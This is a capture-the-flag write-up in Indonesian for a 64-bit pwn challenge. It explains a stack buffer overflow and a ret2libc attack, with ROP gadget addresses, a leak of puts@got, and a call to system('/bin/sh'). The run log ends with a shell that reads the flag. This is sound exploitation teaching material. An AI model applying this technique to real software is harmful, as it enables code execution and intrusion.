# echo siang gratis

# Tools
- ROPgadget
- GDB
- pwntools

# analysis & step by step expoit

first, karena chall ini memiliki libc, aku gunakan pwninit untuk melakukan patch elf. dari metadata dan checksec, file ini adalah 64 bit dan tidak dilengkapi proteksi
canary serta PIE.

dari GDB aku menemukan beberapa fungsi utama:

- main
- greet
- vulnerable
- usefulGadgets

kerentanan ada pada fungsi vulnerable, menurut hasil disassemble:

```Assembly
Dump of assembler code for function vulnerable:
   0x00000000004011fb <+0>:     endbr64
   0x00000000004011ff <+4>:     push   rbp
   0x0000000000401200 <+5>:     mov    rbp,rsp
   0x0000000000401203 <+8>:     sub    rsp,0x40 <-- ukuran buffer di stack
   .................. ....:     ....   ...,....
   0x000000000040122e <+51>:    mov    edx,0x400 <-- ukuran maksimal input di fungsi read()
   0x0000000000401233 <+56>:    mov    rsi,rax
   0x0000000000401236 <+59>:    mov    edi,0x0
   0x000000000040123b <+64>:    call   0x4010a0 <read@plt>
```

karena **read()** mengizinkan input sebanyak 0x400 byte, ini akan bermasalah. jika aku memasukkan string sepanjang 0x50 string tersebut memang akan / masih valid di program
namun string yang tersimpan hanya dari 0x0 sampai 0x40, string mulai dari 0x41 hingga 0x50 akan tersimpan diluar stack dan menimpa alamat memory lain. kerentanan ini disebut
kerentanan buffer overflow.

untuk menghitung jarak ke return address cukup mudah. cara cepat nya adalah dengan menjumlahkan ukuran stack dengan 8 byte . **0x40+0x8=0x48** (72 dalam desimal)
offset seperti ini bisa di cari dengan gdb juga.

melalui kerentanan ini aku bisa mengubah alur program karena aku bisa memanipulasi value dari return address dengan menimpanya dengan string overflow ku.

namun akan merubah alur program kemana? program ini tidak memiliki fungsi win atau bahkan tanda tanda akan melakukan print flag. sama sekali tidak ada.


setelah ku telusuri ternyata memang tidak ada fungsi apapun yang berhubungan dengan flag. artinya, targetnya bukan flag. tapi libc. di file libc.so.6 menyimpan banyak sekali
fungsi fungsi untuk program bahasa C. fungsi itu termasuk **system()**. jika aku mengeksekusi system(/bin/sh) maka program akan mengaktifkan shell. 

namun libc dilengkapi dengan aslr , maka alamat fungsinya akan diacak tiap kali binary aku run. jadi harus di leak dulu. 

rencananya: 
- mencari address gadget poprdi dan ret
- gunakan puts untuk mencetak puts@got dan menghitung lib base address
- mengambil address fungsi system()
- mengambil address string /bin/sh
- mengirim payload buffof berupa rop chain
- akses shell dan flag


**cari gadget**

cari rop gadget gunakan tools ROPgadget :
```
└> ROPgadget --binary ./chall | grep "ret" ; ROPgadget --binary ./chall | grep "rdi"
```
```
0x000000000040101a : ret
```
kandidat ret yang sangat bersih. address ret : **0x40101a**

```
0x00000000004011be : pop rdi ; ret
```
sempurna, address rdi : **4011be**

kenapa butuh ropgadget rdi? melihat ulang metadatanya, program ini adalah binary 64 bit. ketika memanggil fungsi dengan argumen, argumen tersebut akan dimasukkan ke 
pointer bernama register terlebih dahulu, baru register itu dimasukkan ke fungsi , jadi bukan system(/bin/sh) tapi system(rdi) , dan untuk memasukkan value ke rdi butuh
gadget pop rdi disusul valuenya.

ini sudah cukup . jadi aku akan membuat program lompat ke fungsi puts dan membuatnya mencetak alamat puts@got , sintaksnya akan jadi : puts(puts@got)

setelah dapat alamatnya aku akan menguranginya dengan puts static di libc . dan mendapatkan base address dari libc. dengan mendapatkan base address nya, aku bisa mengakses
semua fungsi di libc,

mencari string, cukup mudah. bisa pakai pwntools yaitu libc.search()

aku tinggal melanjutkan rop chain ke dua dengan memanggil system dengan string /bin/sh sebagai argumen pertamanya

selanjutnya adalah membuat [skrip python](solver.py)

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(ret2libc)
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/project/ret2libc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/rotalactf/reno/pwn/project/ret2libc/chall_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
[+] Starting local process './chall_patched': pid 8620
0x77b24a687be0
0x77b24a600000
[*] Switching to interactive mode
Give me your input: You said: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbe\x11@
$ ls
chall  chall_patched  flag.txt    libc.so.6  solver.py  source.c
$ cat flag.txt
flag{r3t2l1bc_or_r3t2w1n_y0u_ch0se_th3_p4th}
$
```
welldone
flag : **flag{r3t2l1bc_or_r3t2w1n_y0u_ch0se_th3_p4th}**


